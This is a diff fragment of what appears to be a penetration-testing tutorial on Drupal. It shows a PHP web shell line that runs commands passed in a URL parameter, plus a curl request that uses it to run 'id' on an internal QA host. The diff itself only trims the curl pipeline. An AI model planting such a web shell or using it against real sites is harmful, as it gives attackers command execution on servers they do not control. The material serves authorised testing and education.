@@ -313,7 +313,7 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, e.g `http://drupal-qa.company.local/node/3`.
 
 ```
-curl -s http://drupal-qa.company.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+curl -s http://drupal-qa.company.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
 From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
 ```
